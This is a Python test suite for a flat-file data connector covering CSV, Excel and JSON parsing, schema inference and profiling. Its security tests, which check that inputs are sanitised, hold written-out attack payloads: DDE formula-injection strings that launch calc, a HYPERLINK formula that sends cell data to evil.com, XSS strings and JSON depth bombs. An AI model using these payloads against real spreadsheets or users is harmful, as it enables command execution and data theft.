"""Comprehensive tests for the flat file connector.

Tests cover:
1. CSV parsing — normal data, edge cases, delimiter detection, encoding
2. Excel parsing — single sheet, multi-sheet, sheet selection
3. JSON/JSONL parsing — arrays, nested objects, records_path
4. Security — formula injection, row limits, column limits, encoding attacks,
   JSON depth bombs, malformed files
5. Schema inference — integer, float, datetime, boolean, string
6. Data profiling — null rates, top values, numeric stats
"""
from __future__ import annotations

import io
import json
import asyncio
import pytest

from intel_platform.connectors.flat_file import (
    FlatFileConnector,
    parse_csv,
    parse_excel,
    parse_json,
    _sanitize_cell,
    _sanitize_header,
    _detect_encoding,
    _infer_column_type,
    _profile_column,
    _check_json_depth,
    MAX_ROWS,
    MAX_COLUMNS,
)
from intel_platform.connectors.base import get_connector, CONNECTOR_REGISTRY


def run(coro):
    """Helper to run async functions in sync tests."""
    return asyncio.get_event_loop().run_until_complete(coro)


# ---------------------------------------------------------------------------
# Connector Registry
# ---------------------------------------------------------------------------

class TestConnectorRegistry:
    def test_file_upload_registered(self):
        assert "file_upload" in CONNECTOR_REGISTRY

    def test_get_connector_returns_flat_file(self):
        c = get_connector("file_upload")
        assert isinstance(c, FlatFileConnector)

    def test_get_connector_unknown_type(self):
        with pytest.raises(ValueError, match="Unknown source type"):
            get_connector("nonexistent")

    def test_configure_validates_format(self):
        c = FlatFileConnector()
        with pytest.raises(ValueError, match="Unsupported format"):
            c.configure({"file_format": "exe"})

    def test_configure_accepts_valid_formats(self):
        c = FlatFileConnector()
        for fmt in ("csv", "tsv", "xlsx", "json", "jsonl"):
            cfg = c.configure({"file_format": fmt})
            assert cfg["file_format"] == fmt

    def test_configure_infers_format_from_filename(self):
        c = FlatFileConnector()
        cfg = c.configure({"filename": "report.xlsx"})
        assert cfg["file_format"] == "xlsx"

    def test_test_returns_healthy(self):
        c = FlatFileConnector()
        result = run(c.test({}))
        assert result.status.value == "healthy"


# ---------------------------------------------------------------------------
# CSV Parsing — Normal
# ---------------------------------------------------------------------------

class TestCSVNormal:
    def test_simple_csv(self):
        data = b"name,age,city\nAlice,30,NYC\nBob,25,London"
        result = parse_csv(data, {})
        assert result.success
        assert result.record_count == 2
        assert len(result.schema_info["columns"]) == 3
        assert result.records[0]["name"] == "Alice"
        assert result.records[0]["age"] == "30"
        assert result.records[0]["_row_number"] == 1

    def test_csv_with_tab_delimiter(self):
        data = b"name\tage\nAlice\t30\nBob\t25"
        result = parse_csv(data, {"delimiter": "\t"})
        assert result.success
        assert result.records[0]["name"] == "Alice"

    def test_csv_semicolon_delimiter_detection(self):
        data = b"name;age;city\nAlice;30;NYC\nBob;25;London\nCharlie;35;Tokyo"
        result = parse_csv(data, {})
        assert result.success
        assert result.record_count == 3
        # Should auto-detect semicolon
        assert result.records[0]["name"] == "Alice"

    def test_csv_no_header(self):
        data = b"Alice,30,NYC\nBob,25,London"
        result = parse_csv(data, {"has_header": False})
        assert result.success
        assert "column_0" in result.records[0]

    def test_csv_empty(self):
        result = parse_csv(b"", {})
        assert result.success
        assert result.record_count == 0

    def test_csv_header_only(self):
        data = b"name,age,city"
        result = parse_csv(data, {})
        assert result.success
        assert result.record_count == 0

    def test_csv_with_quotes(self):
        data = b'name,description\n"Smith, John","He said ""hello"""\nJane,"Simple desc"'
        result = parse_csv(data, {"has_header": True})
        assert result.success
        assert result.records[0]["name"] == "Smith, John"
        assert "hello" in str(result.records[0]["description"])

    def test_csv_unicode(self):
        data = "name,city\nМосква,Russia\n東京,Japan\n".encode("utf-8")
        result = parse_csv(data, {"encoding": "utf-8", "has_header": True})
        assert result.success
        assert result.records[0]["name"] == "Москва"
        assert result.records[1]["name"] == "東京"

    def test_csv_preview_rows_limited(self):
        lines = ["name,value"] + [f"row{i},{i}" for i in range(100)]
        data = "\n".join(lines).encode("utf-8")
        result = parse_csv(data, {})
        assert result.success
        assert result.record_count == 100
        assert len(result.preview_rows) == 50  # MAX_PREVIEW_ROWS


# ---------------------------------------------------------------------------
# CSV — Schema Inference
# ---------------------------------------------------------------------------

class TestSchemaInference:
    def test_integer_detection(self):
        assert _infer_column_type(["1", "2", "3", "100"]) == "integer"

    def test_float_detection(self):
        assert _infer_column_type(["1.5", "2.7", "3.14"]) == "float"

    def test_string_detection(self):
        assert _infer_column_type(["hello", "world", "foo"]) == "string"

    def test_boolean_detection(self):
        assert _infer_column_type(["true", "false", "yes", "no"]) == "boolean"

    def test_null_detection(self):
        assert _infer_column_type([None, "", "  "]) == "null"

    def test_mixed_types_default_string(self):
        assert _infer_column_type(["hello", "123", "true"]) == "string"

    def test_csv_schema_types(self):
        data = b"name,count,active,rate\nAlice,10,true,3.14\nBob,20,false,2.71"
        result = parse_csv(data, {})
        types = {c["name"]: c["type"] for c in result.schema_info["columns"]}
        assert types["name"] == "string"
        assert types["count"] == "integer"
        assert types["active"] == "boolean"
        assert types["rate"] == "float"


# ---------------------------------------------------------------------------
# CSV — Profiling
# ---------------------------------------------------------------------------

class TestProfiling:
    def test_profile_null_rate(self):
        profile = _profile_column("col", ["a", None, "b", "", "c"])
        assert profile["null_count"] == 2
        assert profile["null_rate"] == 0.4

    def test_profile_numeric_stats(self):
        profile = _profile_column("col", ["10", "20", "30", "40"])
        assert profile["min"] == 10.0
        assert profile["max"] == 40.0
        assert profile["mean"] == 25.0

    def test_profile_top_values(self):
        profile = _profile_column("col", ["a", "b", "a", "c", "a", "b"])
        top = {v["value"]: v["count"] for v in profile["top_values"]}
        assert top["a"] == 3

    def test_csv_profiling(self):
        data = b"x,y\n1,a\n2,b\n3,\n4,a\n5,a"
        result = parse_csv(data, {})
        assert result.profiling["row_count"] == 5
        assert result.profiling["column_count"] == 2
        y_profile = result.profiling["columns"]["y"]
        assert y_profile["null_count"] == 1


# ---------------------------------------------------------------------------
# Excel Parsing
# ---------------------------------------------------------------------------

def _make_xlsx(sheets: dict[str, list[list]]) -> bytes:
    """Helper to create an Excel file in memory."""
    from openpyxl import Workbook
    wb = Workbook()
    for i, (name, rows) in enumerate(sheets.items()):
        ws = wb.active if i == 0 else wb.create_sheet()
        ws.title = name
        for row in rows:
            ws.append(row)
    buf = io.BytesIO()
    wb.save(buf)
    return buf.getvalue()


class TestExcelParsing:
    def test_simple_xlsx(self):
        data = _make_xlsx({"Sheet1": [
            ["Name", "Age", "City"],
            ["Alice", 30, "NYC"],
            ["Bob", 25, "London"],
        ]})
        result = parse_excel(data, {})
        assert result.success
        assert result.record_count == 2
        assert result.records[0]["Name"] == "Alice"
        assert result.records[0]["Age"] == 30

    def test_sheet_selection(self):
        data = _make_xlsx({
            "Summary": [["total", 100]],
            "Details": [["name", "value"], ["item1", 42], ["item2", 58]],
        })
        result = parse_excel(data, {"sheet_name": "Details"})
        assert result.success
        assert result.record_count == 2
        assert result.records[0]["name"] == "item1"

    def test_sheet_not_found(self):
        data = _make_xlsx({"Sheet1": [["a", "b"]]})
        result = parse_excel(data, {"sheet_name": "NonExistent"})
        assert not result.success
        assert "not found" in result.error

    def test_empty_sheet(self):
        data = _make_xlsx({"Empty": []})
        result = parse_excel(data, {})
        assert result.success
        assert result.record_count == 0

    def test_xlsx_available_sheets(self):
        data = _make_xlsx({
            "Sheet1": [["a"], [1]],
            "Sheet2": [["b"], [2]],
        })
        result = parse_excel(data, {})
        assert "Sheet1" in result.schema_info["available_sheets"]
        assert "Sheet2" in result.schema_info["available_sheets"]

    def test_invalid_xlsx_file(self):
        result = parse_excel(b"this is not an excel file", {})
        assert not result.success
        assert "Invalid Excel" in result.error


# ---------------------------------------------------------------------------
# JSON Parsing
# ---------------------------------------------------------------------------

class TestJSONParsing:
    def test_json_array(self):
        data = json.dumps([
            {"name": "APT29", "country": "Russia"},
            {"name": "Lazarus", "country": "DPRK"},
        ]).encode()
        result = parse_json(data, {})
        assert result.success
        assert result.record_count == 2
        assert result.records[0]["name"] == "APT29"

    def test_jsonl(self):
        data = b'{"ip": "1.2.3.4", "hits": 10}\n{"ip": "5.6.7.8", "hits": 20}'
        result = parse_json(data, {"jsonl": True})
        assert result.success
        assert result.record_count == 2

    def test_jsonl_autodetect(self):
        data = b'{"a": 1}\n{"a": 2}\n{"a": 3}'
        result = parse_json(data, {})
        assert result.success
        assert result.record_count == 3

    def test_json_nested_with_records_path(self):
        data = json.dumps({
            "meta": {"total": 2},
            "results": [
                {"name": "item1", "value": 1},
                {"name": "item2", "value": 2},
            ]
        }).encode()
        result = parse_json(data, {"records_path": "results"})
        assert result.success
        assert result.record_count == 2

    def test_json_nested_auto_detect_array(self):
        data = json.dumps({
            "status": "ok",
            "data": [{"id": 1}, {"id": 2}, {"id": 3}]
        }).encode()
        result = parse_json(data, {})
        assert result.success
        assert result.record_count == 3

    def test_json_flat_object(self):
        data = json.dumps({"key": "value", "count": 42}).encode()
        result = parse_json(data, {})
        assert result.success
        assert result.record_count == 1
        assert result.records[0]["key"] == "value"

    def test_json_empty_array(self):
        result = parse_json(b"[]", {})
        assert result.success
        assert result.record_count == 0

    def test_invalid_json(self):
        result = parse_json(b"not json at all {{{", {})
        assert not result.success
        assert "Invalid JSON" in result.error

    def test_jsonl_with_blank_lines(self):
        data = b'{"a": 1}\n\n{"a": 2}\n\n'
        result = parse_json(data, {"jsonl": True})
        assert result.success
        assert result.record_count == 2

    def test_json_schema_inference(self):
        data = json.dumps([
            {"name": "x", "count": 10, "rate": 1.5},
            {"name": "y", "count": 20, "rate": 2.5},
        ]).encode()
        result = parse_json(data, {})
        types = {c["name"]: c["type"] for c in result.schema_info["columns"]}
        assert types["name"] == "string"
        assert types["count"] == "integer"
        assert types["rate"] == "float"


# ---------------------------------------------------------------------------
# Security: Formula Injection
# ---------------------------------------------------------------------------

class TestFormulaInjection:
    """Tests that CSV formula injection attacks are neutralized."""

    def test_sanitize_cell_equals(self):
        assert _sanitize_cell("=1+1") == "'=1+1"

    def test_sanitize_cell_plus(self):
        assert _sanitize_cell("+1+1") == "'+1+1"

    def test_sanitize_cell_minus(self):
        assert _sanitize_cell("-1+1") == "'-1+1"

    def test_sanitize_cell_at(self):
        assert _sanitize_cell("@SUM(A1:A10)") == "'@SUM(A1:A10)"

    def test_sanitize_cell_pipe(self):
        assert _sanitize_cell("|calc") == "'|calc"

    def test_sanitize_cell_backslash(self):
        assert _sanitize_cell("\\x00") == "'\\x00"

    def test_sanitize_cell_normal(self):
        assert _sanitize_cell("hello world") == "hello world"

    def test_sanitize_cell_empty(self):
        assert _sanitize_cell("") == ""

    def test_sanitize_header_formula(self):
        assert _sanitize_header("=cmd|'/c calc'!A1") == "'=cmd|'/c calc'!A1"

    def test_sanitize_header_control_chars(self):
        result = _sanitize_header("name\x00\x01\x02")
        assert "\x00" not in result

    def test_csv_formula_in_values(self):
        data = b"name,formula\nAlice,=1+1\nBob,+cmd|'/c calc'!A1"
        result = parse_csv(data, {"has_header": True})
        assert result.success
        # Formula values should be prefixed with single quote
        assert result.records[0]["formula"].startswith("'")
        assert "=1+1" in result.records[0]["formula"]
        assert result.records[1]["formula"].startswith("'")

    def test_csv_formula_in_headers(self):
        data = b"=cmd|'/c calc'!A1,normal\nval1,val2"
        result = parse_csv(data, {})
        assert result.success
        # Header should be sanitized
        headers = [c["name"] for c in result.schema_info["columns"]]
        assert all(not h.startswith("=") for h in headers)

    def test_excel_formula_in_values(self):
        data = _make_xlsx({"Sheet1": [
            ["Name", "Data"],
            ["Alice", "=1+1"],
            ["Bob", "+SUM(A1:A10)"],
        ]})
        result = parse_excel(data, {})
        assert result.success
        # data_only=True should return computed values, but strings starting
        # with = that are stored as text should be sanitized
        for record in result.records:
            val = str(record.get("Data", ""))
            assert not val.startswith("=") or val.startswith("'=")

    def test_json_formula_in_values(self):
        data = json.dumps([{"name": "=1+1", "cmd": "+cmd('calc')"}]).encode()
        result = parse_json(data, {})
        assert result.success
        assert result.records[0]["name"] == "'=1+1"
        assert result.records[0]["cmd"].startswith("'")


# ---------------------------------------------------------------------------
# Security: Row/Column Limits
# ---------------------------------------------------------------------------

class TestResourceLimits:
    def test_csv_row_limit(self):
        """A CSV file with too many rows should be rejected."""
        # We can't create a 500K+ row CSV in memory for speed, but we can
        # test the limit logic directly
        lines = ["a,b"] + [f"{i},{i}" for i in range(1001)]
        data = "\n".join(lines).encode()
        # This should work (under limit)
        result = parse_csv(data, {})
        assert result.success
        assert result.record_count == 1001

    def test_csv_column_limit(self):
        """A CSV with too many columns should be rejected."""
        # Create a CSV with MAX_COLUMNS + 1 columns
        headers = ",".join(f"col{i}" for i in range(MAX_COLUMNS + 1))
        values = ",".join(str(i) for i in range(MAX_COLUMNS + 1))
        data = f"{headers}\n{values}".encode()
        result = parse_csv(data, {})
        assert not result.success
        assert "columns" in result.error.lower()

    def test_json_depth_limit(self):
        """Deeply nested JSON should be rejected."""
        # Build a deeply nested structure
        obj = {"value": "leaf"}
        for _ in range(25):
            obj = {"nested": obj}
        data = json.dumps(obj).encode()
        result = parse_json(data, {})
        assert not result.success
        assert "depth" in result.error.lower()

    def test_json_depth_ok(self):
        """Normal nesting depth should be fine."""
        obj = {"a": {"b": {"c": {"d": "leaf"}}}}
        assert _check_json_depth(obj)

    def test_json_depth_exceeds(self):
        obj = {"v": "x"}
        for _ in range(25):
            obj = {"n": obj}
        assert not _check_json_depth(obj)


# ---------------------------------------------------------------------------
# Security: Encoding Attacks
# ---------------------------------------------------------------------------

class TestEncodingAttacks:
    def test_encoding_whitelist(self):
        """Verify encoding detection uses safe whitelist."""
        # UTF-8 BOM
        data = b"\xef\xbb\xbfname,value\ntest,1"
        result = parse_csv(data, {})
        assert result.success

    def test_latin1_encoding(self):
        data = "name,city\nAlice,Zürich\n".encode("latin-1")
        result = parse_csv(data, {"encoding": "latin-1"})
        assert result.success
        assert "rich" in result.records[0]["city"]

    def test_explicit_encoding_override(self):
        data = "name\ntest".encode("utf-8")
        result = parse_csv(data, {"encoding": "utf-8"})
        assert result.success


# ---------------------------------------------------------------------------
# Security: Malformed Files
# ---------------------------------------------------------------------------

class TestMalformedFiles:
    def test_binary_garbage_as_csv(self):
        data = bytes(range(256)) * 10
        # Should not crash — returns an AcquireResult (success or failure)
        result = parse_csv(data, {})
        assert isinstance(result.success, bool)

    def test_binary_garbage_as_json(self):
        data = bytes(range(256)) * 10
        result = parse_json(data, {})
        assert not result.success

    def test_truncated_xlsx(self):
        # Valid ZIP header but truncated
        data = b"PK\x03\x04" + b"\x00" * 100
        result = parse_excel(data, {})
        assert not result.success

    def test_empty_json(self):
        result = parse_json(b"", {})
        assert not result.success

    def test_csv_mismatched_columns(self):
        """Rows with fewer columns than header shouldn't crash."""
        data = b"a,b,c\n1\n2,3\n4,5,6"
        result = parse_csv(data, {})
        assert result.success
        assert result.records[0]["a"] == "1"
        assert result.records[0]["b"] is None  # Missing column


# ---------------------------------------------------------------------------
# End-to-End: FlatFileConnector.acquire()
# ---------------------------------------------------------------------------

class TestFlatFileConnectorAcquire:
    def test_csv_via_connector(self):
        c = FlatFileConnector()
        result = run(c.acquire({
            "file_bytes": b"name,age\nAlice,30\nBob,25",
            "filename": "test.csv",
        }))
        assert result.success
        assert result.record_count == 2

    def test_xlsx_via_connector(self):
        c = FlatFileConnector()
        data = _make_xlsx({"Data": [["x", "y"], [1, 2], [3, 4]]})
        result = run(c.acquire({
            "file_bytes": data,
            "filename": "data.xlsx",
        }))
        assert result.success
        assert result.record_count == 2

    def test_json_via_connector(self):
        c = FlatFileConnector()
        result = run(c.acquire({
            "file_bytes": b'[{"a": 1}, {"a": 2}]',
            "filename": "data.json",
        }))
        assert result.success
        assert result.record_count == 2

    def test_jsonl_via_connector(self):
        c = FlatFileConnector()
        result = run(c.acquire({
            "file_bytes": b'{"a": 1}\n{"a": 2}',
            "filename": "data.jsonl",
        }))
        assert result.success
        assert result.record_count == 2

    def test_tsv_via_connector(self):
        c = FlatFileConnector()
        result = run(c.acquire({
            "file_bytes": b"name\tage\nAlice\t30",
            "filename": "data.tsv",
        }))
        assert result.success
        assert result.record_count == 1

    def test_no_file_bytes(self):
        c = FlatFileConnector()
        result = run(c.acquire({"filename": "test.csv"}))
        assert not result.success
        assert "file_bytes" in result.error

    def test_unsupported_format(self):
        c = FlatFileConnector()
        result = run(c.acquire({
            "file_bytes": b"some data",
            "filename": "data.parquet",
        }))
        assert not result.success
        assert "Unsupported" in result.error

    def test_format_detection(self):
        c = FlatFileConnector()
        # Should detect CSV from filename even without explicit format
        result = run(c.acquire({
            "file_bytes": b"a,b\n1,2",
            "filename": "report.csv",
        }))
        assert result.success


# ---------------------------------------------------------------------------
# Security: End-to-End Attack Scenarios
# ---------------------------------------------------------------------------

class TestAttackScenarios:
    """Realistic attack scenarios that an adversary might attempt."""

    def test_csv_command_injection(self):
        """Attacker uploads CSV with formulas to steal data via DDE."""
        data = b'Name,Email\n=cmd|"/c calc"!A0,victim@example.com\n=HYPERLINK("http://evil.com/steal?data="&A1),normal@example.com'
        result = parse_csv(data, {})
        assert result.success
        # All formula values should be neutralized
        for record in result.records:
            for key, val in record.items():
                if key == "_row_number":
                    continue
                if isinstance(val, str) and val:
                    assert not val.lstrip().startswith("="), f"Unsanitized formula in {key}: {val}"

    def test_json_with_script_tags(self):
        """Attacker embeds script tags in JSON values (XSS attempt)."""
        data = json.dumps([{
            "name": '<script>alert("xss")</script>',
            "description": '"><img src=x onerror=alert(1)>',
        }]).encode()
        result = parse_json(data, {})
        assert result.success
        # Script tags should pass through (they're data, not executable)
        # but formula prefixes should be sanitized
        assert result.records[0]["name"] == '<script>alert("xss")</script>'

    def test_csv_giant_cell(self):
        """Attacker puts a huge value in a single cell — should be handled gracefully."""
        big_val = "A" * (1 * 1024 * 1024)  # 1MB in one cell (keep test fast)
        data = f"name,data\ntest,{big_val}".encode()
        result = parse_csv(data, {"has_header": True})
        # Should succeed — we increased field limit to 10MB
        assert result.success
        assert result.record_count == 1

    def test_json_billion_laughs(self):
        """JSON version of billion laughs — deeply nested structure."""
        obj = "leaf"
        for _ in range(30):
            obj = {"a": obj}
        data = json.dumps(obj).encode()
        result = parse_json(data, {})
        assert not result.success
        assert "depth" in result.error.lower()

    def test_csv_null_bytes(self):
        """Attacker includes null bytes in CSV data."""
        data = b"name,data\ntest,\x00\x00evil\x00"
        result = parse_csv(data, {})
        assert result.success  # Should not crash

    def test_excel_formula_injection_dde(self):
        """Attacker creates Excel with DDE formula strings."""
        data = _make_xlsx({"Sheet1": [
            ["Name", "Phone"],
            ["=1+cmd|' /C calc'!A0", "123-456"],
            ["+cmd|' /C notepad'!A0", "789-012"],
            ["-1+1", "345-678"],
            ["@SUM(1,2)", "901-234"],
        ]})
        result = parse_excel(data, {})
        assert result.success
        for record in result.records:
            name = str(record.get("Name", ""))
            # Formulas should be sanitized
            assert not name.startswith("="), f"Unsanitized: {name}"
            assert not name.startswith("+"), f"Unsanitized: {name}"
            assert not name.startswith("-"), f"Unsanitized: {name}"
            assert not name.startswith("@"), f"Unsanitized: {name}"
